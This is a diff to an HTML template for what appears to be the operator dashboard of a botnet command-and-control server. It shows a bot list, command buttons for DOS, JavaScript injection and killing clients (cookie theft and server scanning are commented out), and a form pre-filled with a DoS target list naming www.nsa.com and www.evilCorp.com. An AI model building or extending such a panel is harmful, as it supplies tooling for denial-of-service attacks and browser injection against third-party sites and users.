@@ -18,27 +18,6 @@
     </head>
 
     <body>
-        <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
-            <div class="container">
-                <div class="navbar-header">
-                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
-                        <span class="sr-only">Toggle navigation</span>
-                        <span class="icon-bar"></span>
-                        <span class="icon-bar"></span>
-                        <span class="icon-bar"></span>
-                    </button>
-                    <a class="navbar-brand" href="#">Project name</a>
-                </div>
-
-                <div class="collapse navbar-collapse">
-                    <ul class="nav navbar-nav">
-                        <li class="active"><a href="#">Home</a></li>
-                        <li><a href="#about">About</a></li>
-                        <li><a href="#contact">Contact</a></li>
-                    </ul>
-                </div><!--.nav-collapse -->
-            </div>
-        </nav>
 
         <div class="container">
             <div class="panel panel-success">
@@ -47,35 +26,37 @@
                 <div class="panel-body">
                     <div class="row">
                         <div class="col-md-6">
-                            <h1> Available commands </h1>
-                            <div class="btn-group" role="group" aria-label="...">
-                                <button type="button" class="btn btn-default" data-type="dos">Dos</button>
-                                <button type="button" class="btn btn-default">injectJs</button>
-                                <button type="button" class="btn btn-default">getCookies</button>
-                                <button type="button" class="btn btn-default">srvScann</button>
-                                <button type="button" class="btn btn-default">killClient</button>
-                            </div>
-                            <h4 id="cmd-format"> dos:[{ prot: "http", host:"www.nsa.com" , port: "80" },
-{ prot: "https", host:"www.evilCorp.com" , port: "443" }]
-</h4>
+                            <img src="spacemarines" >
+                            <p>© YEAR Company_Name.</p>
                         </div>
                         <div class="col-md-6">
-                            <h1> Bot list </h1>
-                            <div class="list-group">
-                                <a href="#" data-id="all" class="list-group-item">All</a>
-                                <a href="#" data-id="23423423" class="list-group-item">23423423</a>
+                            <div>
+                                <h1> Bot list </h1>
+                                <div class="list-group">
+                                    <a href="#" data-id="" class="list-group-item">23423423</a>
+                                    {{#each bots}}
+                                    <a href="#" data-id="" class="list-group-item">{{@key}}</a>
+                                    {{/each}}
+                                </div>
+                            </div>
+                            <div>
+                                <h1> Available commands </h1>
+                                <div class="btn-group" role="group" aria-label="...">
+                                    <button type="button" data-format="" class="btn btn-default">DOS</button>
+                                    <button type="button" data-format="" class="btn btn-default">Inject Javascript</button>
+<!--                                    <button type="button" class="btn btn-default">getCookies</button>-->
+<!--                                    <button type="button" class="btn btn-default">srvScann</button>-->
+                                    <button type="button" data-format="" class="btn btn-default">Kill Client</button>
+                                </div>
                             </div>
                         </div>
                     </div>
                     <div class="row">
                         <form role="form" action="/command/send" method="post">
                             <div class="form-group">
-                                <label for="inputUsernameEmail">Bot</label>
-                                <input name="identifier" type="text" class="form-control" id="inputUsernameEmail">
-                            </div>
-                            <div class="form-group">
                                 <label for="inputPassword">Commands</label>
-                                <textarea name="commands" class="form-control" rows="5">{}</textarea>
+                                <textarea name="commands" class="form-control" rows="5">{dos:[{ prot: "http", host:"www.nsa.com" , port: "80" },
+                                    { prot: "https", host:"www.evilCorp.com" , port: "443" }]}</textarea>
                             </div>
 
                             <button type="submit" class="btn btn btn-success">
@@ -83,23 +64,25 @@
                             </button>
                         </form>
                     </div>
-                    <div class="row">
-                        <!-- Table -->
-                        <table class="table">
-                            <thead>
-                                <tr>
-                                    <th>#Bot id</th>
-                                    <th>Result</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <tr>
-                                    <th>1</th>
-                                    <td>Mark</td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
+                    <!--                    <div class="row">-->
+                    <!-- Table -->
+                    <!--
+<table class="table">
+<thead>
+<tr>
+<th>#Bot id</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<th>1</th>
+<td>Mark</td>
+</tr>
+</tbody>
+</table>
+-->
+                    <!--                    </div>-->
                 </div>
             </div>
         </div>
@@ -110,7 +93,10 @@
         <script src="http://code.jquery.com/jquery-1.11.1.js"></script>
         <script>
             var socket = io();
+            // when a user click cmd button set html of commands to data-format
             //                socket.emit('chat message', "hello");
+            // listen for bot-Join and add recieved {id: id} in the bot list
+            // on form submit
         </script>
     </body>
 </html>
